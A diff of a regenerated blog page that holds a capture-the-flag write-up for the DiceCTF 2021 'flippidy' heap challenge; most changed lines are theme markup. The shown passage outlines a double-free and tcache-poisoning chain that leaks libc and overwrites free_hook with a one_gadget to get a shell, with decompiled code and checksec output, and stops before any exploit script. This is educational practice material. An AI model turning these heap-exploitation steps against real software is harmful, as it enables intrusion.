             <span class="input-group-btn">
-                <button type="submit" class="search-form-submit btn btn-flat"><i class="fa fa-search"></i></button>
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
             </span>
         </div>
     </form>
     <div class="ins-search">
-    <div class="ins-search-mask"></div>
-    <div class="ins-search-container">
-        <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
-            <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
-            <!-- <span class="ins-close ins-selectable"><i class="fa fa-times"></i></span> -->
-        </div>
-        <div class="ins-section-wrapper">
-            <div class="ins-section-container"></div>
-        </div>
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
     </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
 </div>
+
 
 </div>
       <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
@@ -92,14 +97,14 @@
         <span class="icon-bar"></span>
       </button>
     </div>
-    <nav id="main-navbar" class="collapse navbar-collapse">
-      <ul class="nav navbar-nav main-nav">
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
         
         
         <li class="menu-item menu-item-home">
           <a href="/.">
             
-            <i class="fa fa-fw fa-home"></i>
+            <i class="icon icon-home-fill"></i>
             
             <span class="menu-title">Home</span>
           </a>
@@ -109,7 +114,7 @@
         <li class="menu-item menu-item-archives">
           <a href="/archives">
             
-            <i class="fa fa-fw fa-archive"></i>
+            <i class="icon icon-archives-fill"></i>
             
             <span class="menu-title">Archives</span>
           </a>
@@ -119,7 +124,7 @@
         <li class="menu-item menu-item-categories">
           <a href="/categories">
             
-            <i class="fa fa-fw fa-folder"></i>
+            <i class="icon icon-folder"></i>
             
             <span class="menu-title">Categories</span>
           </a>
@@ -129,19 +134,9 @@
         <li class="menu-item menu-item-tags">
           <a href="/tags">
             
-            <i class="fa fa-fw fa-tags"></i>
+            <i class="icon icon-tags"></i>
             
             <span class="menu-title">Tags</span>
-          </a>
-        </li>
-        
-        
-        <li class="menu-item menu-item-competitions">
-          <a href="/competitions">
-            
-            <i class="fa fa-fw fa-flag"></i>
-            
-            <span class="menu-title">Competitions</span>
           </a>
         </li>
         
@@ -149,47 +144,37 @@
         <li class="menu-item menu-item-about">
           <a href="/about">
             
-            <i class="fa fa-fw fa-users"></i>
+            <i class="icon icon-users"></i>
             
             <span class="menu-title">About</span>
           </a>
         </li>
         
       </ul>
-      <div class="footer">
-	
+      
 	
     <ul class="social-links">
     	
-        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="fa fa-github"></i></a></li>
+        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
         
-        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="fa fa-twitter"></i></a></li>
+        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
         
-        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="fa fa-rss"></i></a></li>
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
         
     </ul>
-    
-    <div class="copyright">
-        &copy; 2022 TEAMROCKETIST
-        <div class="publishby">
-        	<!-- Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.
-        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.-->
-        </div>
-    </div>
-</div>
+
     </nav>
   </div>
-</section>
+</header>
 
   
-    <section class="sidebar">
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
   <div class="slimContent">
     
       <div class="widget">
     <h3 class="widget-title">Board</h3>
     <div class="widget-body">
         <div id="board">
-            
             <div class="content">
                 <p>Behind each exploit there is a history of creativity and incredible knowledge.</p>
             </div>
@@ -247,7 +232,7 @@
             
             <div class="item-inner">
               <p class="item-category">
-                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="fa fa-angle-right"></i><a class="category-link" href="/categories/Pwn/Android/">Android</a>
+                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/Pwn/Android/">Android</a>
               </p>
               <p class="item-title">
                 <a href="/2022/08/23/Pwn-WMCTF2022-WM-Baby-Droid/" class="title">[Pwn] WMCTF2022 - WM Baby Droid</a>
@@ -262,7 +247,7 @@
             
             <div class="item-inner">
               <p class="item-category">
-                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="fa fa-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
+                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
               </p>
               <p class="item-title">
                 <a href="/2021/02/08/Pwn-DiceCTF2021-flippidy/" class="title">[Pwn] DiceCTF2021 - flippidy</a>
@@ -292,7 +277,7 @@
             
             <div class="item-inner">
               <p class="item-category">
-                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="fa fa-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
+                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
               </p>
               <p class="item-title">
                 <a href="/2020/03/23/Pwn-FireShell-CTF-2020-FireHTTPD/" class="title">[Pwn] FireShell CTF 2020 - FireHTTPD</a>
@@ -325,14 +310,15 @@
 
     
   </div>
-</section>
+</aside>
 
   
-  <section class="main">
+  
+<main class="main" role="main">
   <div class="content">
-  <article id="post-Pwn-DiceCTF2021-flippidy" class="article article-type-post" itemscope itemprop="blogPost">
+  <article id="post-Pwn-DiceCTF2021-flippidy" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
-    <header class="article-header">
+    <div class="article-header">
       
         
   
@@ -344,74 +330,84 @@
       
       <div class="article-meta">
         <span class="article-date">
-    <i class="fa fa-calendar-check-o"></i>
+    <i class="icon icon-calendar-check"></i>
 	<a href="/2021/02/08/Pwn-DiceCTF2021-flippidy/" class="article-date">
 	  <time datetime="2021-02-08T06:03:26.000Z" itemprop="datePublished">2021-02-08</time>
 	</a>
 </span>
         
   <span class="article-category">
-    <i class="fa fa-folder"></i>
+    <i class="icon icon-folder"></i>
     <a class="article-category-link" href="/categories/Pwn/">Pwn</a>►<a class="article-category-link" href="/categories/Pwn/x64/">x64</a>►<a class="article-category-link" href="/categories/Pwn/x64/Glibc-Malloc/">Glibc Malloc</a>►<a class="article-category-link" href="/categories/Pwn/x64/Glibc-Malloc/Tcache/">Tcache</a>►<a class="article-category-link" href="/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-dup/">tcache_dup</a>►<a class="article-category-link" href="/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-poisoning/">tcache_poisoning</a>
   </span>
 
         
   <span class="article-tag">
-    <i class="fa fa-tag"></i>
+    <i class="icon icon-tags"></i>
 	<a class="article-tag-link" href="/tags/dicectf2021/">dicectf2021</a>, <a class="article-tag-link" href="/tags/double-free/">double_free</a>, <a class="article-tag-link" href="/tags/heap/">heap</a>, <a class="article-tag-link" href="/tags/tcache-poisoning/">tcache_poisoning</a>
   </span>
 
 
         
 
-		
-        <span class="post-comment"><i class="fa fa-commenting-o"></i> <a href="/2021/02/08/Pwn-DiceCTF2021-flippidy/#comments" class="article-comment-link">Comments</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/02/08/Pwn-DiceCTF2021-flippidy/#comments" class="article-comment-link">Comments</a></span>
         
-		
 	
-		<span class="post-wordcount hidden-xs">Word Count: 1,979 (words)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 1,978(words)</span>
 	
 	
-		<span class="post-readcount hidden-xs">Read Time: 12 (min)</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 12(minutes)</span>
 	
 
       </div>
-    </header>
-    <div class="article-entry" itemprop="articleBody">
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
       
         <blockquote>
 <p>flippidy</p>
 </blockquote>
 <blockquote>
 <p><strong>Solves</strong>: 62</p>
-<p><strong>Points</strong>: 149   </p>
-<p><strong>Description</strong>:<br>See if you can flip this program into a flag :D</p>
-<p>nc dicec.tf 31904</p>
-<p><a href="https://mega.nz/file/6r4wXBDL#mBW146qJFxJkSH0S9d88CgrlXBrlcFwr5-EnhC6lOg4" target="_blank" rel="noopener">flippidy</a><br>45ffbb615d868486383a07220e6e6bfc</p>
-<p><a href="https://mega.nz/file/qnhiyZbY#ysipLkhsy6-f3dgR44_2YAk7owxTm_aN4TloGrVYoZ8" target="_blank" rel="noopener">libc.so.6</a><br>50390b2ae8aaa73c47745040f54e602f</p>
+<p><strong>Points</strong>: 149</p>
+<p><strong>Description</strong>:<br>
+See if you can flip this program into a flag 😄</p>
+<p>nc <a href="http://dicec.tf" target="_blank" rel="noopener">dicec.tf</a> 31904</p>
+<p><a href="https://mega.nz/file/6r4wXBDL#mBW146qJFxJkSH0S9d88CgrlXBrlcFwr5-EnhC6lOg4" target="_blank" rel="noopener">flippidy</a><br>
+45ffbb615d868486383a07220e6e6bfc</p>
+<p><a href="https://mega.nz/file/qnhiyZbY#ysipLkhsy6-f3dgR44_2YAk7owxTm_aN4TloGrVYoZ8" target="_blank" rel="noopener">libc.so.6</a><br>
+50390b2ae8aaa73c47745040f54e602f</p>
 <p><strong>Author</strong>: joshdabosh</p>
 </blockquote>
-<h3 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h3><ul>
+<h3 id="tldr"><a class="markdownIt-Anchor" href="#tldr"></a> TLDR</h3>
+<ul>
 <li>Set the limit of notes to 1.</li>
 <li>Alloc a new note with the global <code>0x404020</code>.</li>
 <li>Running flip will trigger a double free and poison the next pointer of tchachebin[0x40] to <code>0x404020</code>.</li>
-<li>Next malloc will write to <code>0x404020</code> which is where is located the pointer of the strings of the menu.  </li>
-<li>Change this pointers to a <code>GOT[&#39;fgets&#39;]</code> to get a leak, at the same time we can corrupt the pointer at <code>0x404040</code> to <code>0x404158</code>. </li>
+<li>Next malloc will write to <code>0x404020</code> which is where is located the pointer of the strings of the menu.</li>
+<li>Change this pointers to a <code>GOT['fgets']</code> to get a leak, at the same time we can corrupt the pointer at <code>0x404040</code> to <code>0x404158</code>.</li>
 <li><code>0x404158</code> is the address of the first entry of the note list having the control of this will give us arbitrary write at our control.</li>
 <li>Change the pointer at <code>0x404158</code> to free_hook and set it to <code>one_gadget</code>.</li>
 <li>Trigger free with <code>flip function</code> to get a shell.</li>
 </ul>
-<h3 id="Information-extraction"><a href="#Information-extraction" class="headerlink" title="Information extraction"></a>Information extraction</h3><p>File<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file flippidy</span><br><span class="line">flippidy: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9bad92d378d5af68a52fd2856145dc8588533a25, <span class="keyword">for</span> GNU/Linux 3.2.0, stripped</span><br></pre></td></tr></table></figure></p>
-<p>Security<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ checksec --file=flippidy</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH  Symbols     FORTIFY Fortified   Fortifiable FILE</span><br><span class="line">Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols    No    0       4       flippidy</span><br></pre></td></tr></table></figure></p>
-<h3 id="Static-analysis"><a href="#Static-analysis" class="headerlink" title="Static analysis"></a>Static analysis</h3><h4 id="Main-function"><a href="#Main-function" class="headerlink" title="Main function"></a>Main function</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  sub_401211();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, <span class="string">"To get started, first tell us how big your notebook will be: "</span>);</span><br><span class="line">  firstRead_404150 = sub_401254();</span><br><span class="line">  qword_404158 = <span class="built_in">malloc</span>(<span class="number">8</span> * firstRead_404150);</span><br><span class="line">  <span class="built_in">memset</span>(qword_404158, <span class="number">0</span>, <span class="number">8</span> * firstRead_404150);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4011C6();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">": "</span>);</span><br><span class="line">    v3 = sub_401254();</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Goodbye!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_11:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add_4012D0();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      flip_401378();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="information-extraction"><a class="markdownIt-Anchor" href="#information-extraction"></a> Information extraction</h3>
+<p>File</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file flippidy</span><br><span class="line">flippidy: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9bad92d378d5af68a52fd2856145dc8588533a25, <span class="keyword">for</span> GNU/Linux 3.2.0, stripped</span><br></pre></td></tr></table></figure>
+<p>Security</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ checksec --file=flippidy</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH  Symbols     FORTIFY Fortified   Fortifiable FILE</span><br><span class="line">Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols    No    0       4       flippidy</span><br></pre></td></tr></table></figure>
+<h3 id="static-analysis"><a class="markdownIt-Anchor" href="#static-analysis"></a> Static analysis</h3>
+<h4 id="main-function"><a class="markdownIt-Anchor" href="#main-function"></a> Main function</h4>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  sub_401211();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, <span class="string">"To get started, first tell us how big your notebook will be: "</span>);</span><br><span class="line">  firstRead_404150 = sub_401254();</span><br><span class="line">  qword_404158 = <span class="built_in">malloc</span>(<span class="number">8</span> * firstRead_404150);</span><br><span class="line">  <span class="built_in">memset</span>(qword_404158, <span class="number">0</span>, <span class="number">8</span> * firstRead_404150);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4011C6();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">": "</span>);</span><br><span class="line">    v3 = sub_401254();</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Goodbye!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_11:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add_4012D0();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      flip_401378();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>The main function asks for the size of the note list, the size of the list is stored at <code>0x404150</code>:</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_401254</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(&amp;s, <span class="number">0x14</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)atoi(&amp;s);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>, <span class="string">"To get started, first tell us how big your notebook will be: "</span>);</span><br><span class="line">firstRead_404150 = sub_401254();</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p><code>sub_4011c6</code> will print the menu with the options to operate on the notebook, note that the strings are present in a global variable at <code>0x404020</code>.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_4011C6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">puts</span>(<span class="string">"\n"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">    result = <span class="built_in">puts</span>(off_404020[i]);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"> ...</span><br><span class="line"> <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4011C6();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">": "</span>);</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure></p>
+<p><code>sub_4011c6</code> will print the menu with the options to operate on the notebook, note that the strings are present in a global variable at <code>0x404020</code>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_4011C6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">puts</span>(<span class="string">"\n"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">    result = <span class="built_in">puts</span>(off_404020[i]);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"> ...</span><br><span class="line"> <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4011C6();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">": "</span>);</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
 <p>A very important thing to refer that offsets at <code>0x404020</code> contains pointers (we can use this later if we manage to get an arbitrary write to leak libc):</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000404020</span> off_404020      dq offset aMenu         ; DATA XREF: sub_4011C6+<span class="number">2</span>A↑o</span><br><span class="line">.data:<span class="number">0000000000404020</span>                                         ; <span class="string">"----- Menu -----"</span></span><br><span class="line">.data:<span class="number">0000000000404028</span>                 dq offset a1AddToYourNote ; <span class="string">"1. Add to your notebook"</span></span><br><span class="line">.data:<span class="number">0000000000404030</span>                 dq offset a2FlipYourNoteb ; <span class="string">"2. Flip your notebook!"</span></span><br><span class="line">.data:<span class="number">0000000000404038</span>                 dq offset a3Exit        ; <span class="string">"3. Exit"</span></span><br><span class="line">.data:0000000000404040 aMenu           db '----- Menu -----',0 ; DATA XREF: .data:off_404020↑o</span><br></pre></td></tr></table></figure>
-<h3 id="Add-to-your-notebook"><a href="#Add-to-your-notebook" class="headerlink" title="Add to your notebook"></a>Add to your notebook</h3><p>We can add new notes with option 1, the size is limited to 0x30.</p>
+<h3 id="add-to-your-notebook"><a class="markdownIt-Anchor" href="#add-to-your-notebook"></a> Add to your notebook</h3>
+<p>We can add new notes with option 1, the size is limited to 0x30.</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_4012D0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> **v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">  v2 = sub_401254();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= firstRead_404150 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid index."</span>);</span><br><span class="line">  v1 = (<span class="keyword">void</span> **)((<span class="keyword">char</span> *)qword_404158 + <span class="number">8</span> * v2);</span><br><span class="line">  *v1 = <span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int64)fgets(*((<span class="keyword">char</span> **)qword_404158 + v2), <span class="number">0x30</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="Flip-function"><a href="#Flip-function" class="headerlink" title="Flip function"></a>Flip function</h3><p>Flip function will exchange the position of the notes hence the name flipping, in the end it frees the old notes and mallocs the new ones by copping their contents with strcpy.</p>
+<h3 id="flip-function"><a class="markdownIt-Anchor" href="#flip-function"></a> Flip function</h3>
+<p>Flip function will exchange the position of the notes hence the name flipping, in the end it frees the old notes and mallocs the new ones by copping their contents with strcpy.</p>
 <p>For example if the notebook has 2 notes this how it works:</p>
 <ul>
 <li><code>strcpy</code> the contents of 1st note to <code>s</code>.</li>
@@ -422,10 +418,15 @@
 <li><code>malloc</code> and store this new chunk at the position of the 1st note and <code>strcpy</code> the content of the 2nd note <code>dest</code>.</li>
 </ul>
